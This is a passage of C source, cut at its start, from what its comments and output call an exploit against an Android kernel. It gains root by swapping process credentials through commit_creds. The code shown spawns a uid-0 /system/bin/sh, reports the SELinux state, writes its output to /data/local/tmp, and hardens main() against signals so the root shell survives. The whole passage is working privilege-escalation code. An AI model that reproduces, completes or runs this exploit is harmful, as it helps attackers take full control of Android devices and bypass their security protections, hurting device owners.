       * waiter/owner/consumer threads (their sleeps are
       * interruptible - the sendmsg wait is killable). */
      int storm_capture = (g_storm_block_start >= 0 &&
                           g_hit_block >= g_storm_block_start);
      if (hits >= plans && !storm_capture && ghost_exec && !shell_spawned) {
        /* Same rule as the early root shell: NEVER exec from the parent
         * (de_thread reaping the exploit threads panicked the device).
         * clone a single-threaded root child to hold the shell; the
         * parent then exit_group()s, whose thread reaping is the path
         * the pre-fix successful runs already survived. */
        static const char *sh_path = "/system/bin/sh";
        const char *sh_argv[] = { "sh", NULL };
        const char *sh_envp[] = {
          "PATH=/sbin:/system/sbin:/system/bin:/system/xbin:/vendor/bin",
          "HOME=/data/local/tmp",
          "TERM=xterm-256color",
          NULL,
        };
        RAW_WRITE(1, "[+] ROOT: uid=0 selinux=");
        raw_wstr(1, g_selinux_off ? "permissive" : "enforcing");
        RAW_WRITE(1, " hits="); raw_wdec(1, hits);
        RAW_WRITE(1, "/"); raw_wdec(1, plans);
        RAW_WRITE(1, " - cloning /system/bin/sh "
                    "(battery: /data/local/tmp/.ghostlock_out)\n");
        long cpid = syscall(__NR_clone, (unsigned long)SIGCHLD, 0, 0, 0, 0);
        if (cpid == 0) {
          syscall(__NR_execve, sh_path, (char *const *)sh_argv,
                  (char *const *)sh_envp);
          syscall(__NR_exit, 127);
        }
        if (cpid < 0) {
          RAW_WRITE(1, "[!] clone failed");
          RAW_WERRNO(1);
          RAW_WRITE(1, " - no root shell\n");
        } else {
          RAW_WRITE(1, "[+] root shell pid="); raw_wdec(1, cpid);
          RAW_WRITE(1, "\n");
        }
      } else {
        RAW_WRITE(1, "[!] partial plan (hits=");
        raw_wdec(1, hits);
        RAW_WRITE(1, "/"); raw_wdec(1, plans);
        if (storm_capture) {
          RAW_WRITE(1, ") or storm capture (block=");
          raw_wdec(1, g_hit_block);
          RAW_WRITE(1, ") - skipping exec (storm capture: page-1 "
                      "payload not ours; commit_creds BUG_ON walk guard); "
                      "battery written\n");
        } else {
          RAW_WRITE(1, ") - skipping exec (commit_creds BUG_ON guard); "
                      "battery written\n");
        }
      }
      syscall(__NR_fsync, 1);
      syscall(__NR_exit_group, 99);
      return 0;
    }
  }
  pr_error("cred swap failed after %d attempts\n", attempts);
  return 1;
}

#include <signal.h>
static void ghost_segv_handler(int sig, siginfo_t *si, void *uc) {
  char b[160];
  int n = snprintf(b, sizeof(b),
      "[FATAL] signal %d at addr %p (main thread died post-cred-swap?)\n",
      sig, si->si_addr);
  write(1, b, n);
  _exit(139);
}

int main(int argc, char **argv) {
    struct sigaction sa = { .sa_sigaction = ghost_segv_handler,
                            .sa_flags = SA_SIGINFO };
    sigaction(SIGSEGV, &sa, NULL);
    sigaction(SIGBUS, &sa, NULL);
    /* A broken/EOF stdout (adb hiccup, terminal close) must not SIGPIPE-kill
     * the exploit mid-run: the cred swap + exec path prints to stdout right
     * before execl(), and a SIGPIPE there silently kills the whole process
     * before the root shell can spawn. Ignored dispositions survive exec. */
    signal(SIGPIPE, SIG_IGN);
    if (argc > 1 && strcmp(argv[1], "--selftest") == 0)
        return run_selftest();
    if (argc > 1 && strcmp(argv[1], "--cred") == 0)
        return run_cred_swap();
    return run_cred_swap();
}
